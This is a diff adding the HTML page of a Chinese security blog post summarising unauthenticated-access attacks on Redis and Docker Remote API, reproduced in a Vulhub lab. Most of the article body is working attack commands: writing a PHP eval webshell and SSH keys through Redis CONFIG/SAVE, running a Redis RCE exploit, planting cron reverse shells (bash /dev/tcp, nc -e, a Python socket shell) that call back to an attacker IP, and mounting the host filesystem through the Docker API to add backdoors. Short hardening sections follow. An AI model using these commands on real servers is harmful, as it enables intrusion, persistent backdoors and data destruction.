@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>未授权访问总结 - 明月归的小站</title>
+  
+    <meta name="keywords" content="未授权访问,Redis,Docker">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了未授权访问的相关内容！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">未授权访问总结</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/">
+      未授权访问总结
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年4月5日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：2k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：8分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/" class="leancloud_visitors" data-flag-title="未授权访问总结">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了未授权访问的相关内容！</p>
+<a id="more"></a>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷导致其他用户可以直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p>
+<h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Redis 是一个高性能的 Key – Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。</p>
+<p>Redis 默认情况下会绑定在 <code>0.0.0.0:6379</code>，这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。</p>
+<p>攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法成功地在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
+<p>Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>这里直接用vulhub搭一下环境，搭建好用namp扫下,查看一下Redis的详细信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info 47.97.210.141</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403214810.png" style="zoom: 80%;">
+
+<p>由于目标环境没有开启认证(空密码)，我们可以直接登陆进去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 6379</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403230731.png" style="zoom:80%;">
+
+<p>常见的Redis命令(不区分大小写)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping 	<span class="comment">#查看redis启动状态，返回PONG为正常</span></span><br><span class="line">key  * 　　<span class="comment">#查看redis中的所有键</span></span><br><span class="line">exists  key 　　 <span class="comment">#判断一个键是否存在，存在返回1，否则返回0</span></span><br><span class="line">del  key  [key...] 　　 <span class="comment">#删除一个或多个键，返回删除的键的个数</span></span><br><span class="line">type  key 　　 <span class="comment">#获得键值的数据类型</span></span><br><span class="line">set  key  value　　<span class="comment">#给键赋值</span></span><br><span class="line">mset  key1  v1  key2  v2  key3  v3　　<span class="comment">#同时给多个键赋值</span></span><br><span class="line">get  key　　<span class="comment">#取值</span></span><br><span class="line">mget  key1  key2  key3　　<span class="comment">#同时获取多个键值</span></span><br><span class="line">append  key  value　　<span class="comment">#在字符串后面追加值，如果该键不存在即为为这个键赋值（该命令第二个参数需要加引号，因为有可能追加空格，所以要引起来）</span></span><br><span class="line">strlen  key　　<span class="comment">#返回键值的长度，如果不存在返回0</span></span><br><span class="line">config	<span class="comment">#获取和设置配置</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="网站写马"><a href="#网站写马" class="headerlink" title="网站写马"></a>网站写马</h4><p>如果目标服务开的有web服务,并且对应目录有写的权限，我们可以试着往网站目录写一个webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200403235951.png" style="zoom:80%;">
+
+<p>如果网站目录没有写权限，我们可以在<code>/tmp</code>里写，然后找文件包含之类的漏洞</p>
+<p>真实环境的Redis数据库会很大，我们直接save的话会保存一个很大的文件，而且里面不免有影响webshell正常执行的因素，因此一个比较好的思路就是将Redis保存的文件作为中间文件，再用这个中间文件来写shell，并且从备份的文件里找到一个靠前的键，把shell写入值里，可以构造类似：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);	<span class="comment">//取消执行时间限制</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;wtf.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然没有顾虑的话也可以直接用<code>flushall</code>删库跑路</p>
+<h4 id="结合SSH免密码登录"><a href="#结合SSH免密码登录" class="headerlink" title="结合SSH免密码登录"></a>结合SSH免密码登录</h4><p>如果Redis使用root用户启动，并且开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
+<p>在kali <code>/root/.ssh</code>目录下执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 47.97.210.141 -p 9997 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line">	config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">	config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">	save</span><br></pre></td></tr></table></figure>
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这里直接用github上大佬的exp：<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<p>exp.so可以从这里获得：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 47.97.210.141 -p 9997 -L 47.97.210.141 -f exp.so</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200404180709.png" style="zoom:80%;">
+
+<h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>Redis以root权限运行时可以写crontab来执行命令反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/47.97.210.141/4444 0&gt;&amp;1\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h3><p>修改<code>redis.conf</code>监听本机地址<code>127.0.0.1</code></p>
+<p>修改<code>redis.conf</code>添加<code>requirepass mypassword</code>设置认证</p>
+<p>修改 redis.conf 文件，禁用远程修改 DB 文件地址</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command CONFIG   <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command <span class="keyword">EVAL</span>     <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>以低权限运行 Redis 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+
+<p>iptables</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line"><span class="comment">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"><span class="comment">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line"><span class="comment">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span></span><br><span class="line"><span class="comment">## iptables -I INPUT -p udp --dport 6379 -j DROP</span></span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line"><span class="comment">## service iptables save</span></span><br><span class="line"><span class="comment">## service iptables restart</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p>
+<p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，监听在<code>0.0.0.0:2375</code>。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>还是用Vulhub上的</p>
+<p><img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405124115.png"></p>
+<p>访问<code>/version</code>可以看到版本信息</p>
+<p>也可以直接用docker命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 version</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405184112.png" style="zoom:80%;">
+
+<p>同样我们可以执行其它命令</p>
+<h4 id="计划任务反弹shell-1"><a href="#计划任务反弹shell-1" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><p>随意启动一个镜像，没有的话pull一个，这里用的是基于<code>Alpine Linux</code>的超小型Docker镜像,大小只有几兆</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 pull alpine:latest</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405194440.png" style="zoom:80%;">
+
+<p>接着</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 run -id -v /:/tmp alpine:latest</span><br><span class="line"><span class="comment"># 列一下正在运行的容器</span></span><br><span class="line">docker -H tcp://47.97.210.141:29375 ps</span><br><span class="line"><span class="comment"># 进入容器并把/目录挂载到容器的/tmp目录下</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 <span class="built_in">exec</span> -it 7c99cec3c42a sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM截图20200405215112.png" style="zoom:80%;">
+
+<p>可以看到我们已经成功挂载并可以读取文件了，写后门，然后退出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * /usr/bin/nc 47.97.210.141 9000 -e /bin/sh&#x27;</span> &gt;&gt; /tmp/etc/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405220719.png"></p>
+<p>也可以写入其他的,视环境而定，比如python</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;*/1 * * * * root /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p>同样，可以将反弹shell的脚本写入写入到<code>/var/spool/cron/root</code>（centos系统）或<code>/var/spool/cron/crontabs/root</code>(ubuntu系统)</p>
+<h4 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h4><p>写ssh公钥和上面方法类似，都是写文件嘛</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>把文件内容放到目标主机<code>/root/.ssh/id_rsa.pub</code>文件里就行了</p>
+<p>github上有个脚本：<a target="_blank" rel="noopener" href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p>
+<p>可以直接执行脚本写计划任务反弹shell等操作</p>
+<h3 id="防护手段-1"><a href="#防护手段-1" class="headerlink" title="防护手段"></a>防护手段</h3><p>在不必需的情况下，不要启用 docker 的 remote api 服务，如果必须使用的话，可以采用如下的加固方式：</p>
+<ol>
+<li>设置 ACL，仅允许信任的来源 IP 连接</li>
+<li>设置 TLS 认证，官方的文档为 Protect the Docker daemon socket</li>
+</ol>
+<p>修改 Docker 的启动参数：<br>定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1，将默认端口 2375 改为自定义端口</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/redis/redis-tutorial.html">https://www.runoob.com/redis/redis-tutorial.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Qsunshine/p/redis.html">https://www.cnblogs.com/Qsunshine/p/redis.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2320">https://xz.aliyun.com/t/2320</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/39440.html">https://www.secpulse.com/archives/39440.html</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/>http://www.moonback.xyz/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-05T22:55:13+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年4月5日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>未授权访问</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Redis/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Redis</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Docker/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Docker</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/04/05/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/&title=未授权访问总结 - 明月归的小站&summary=本篇博客主要介绍了未授权访问的相关内容！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
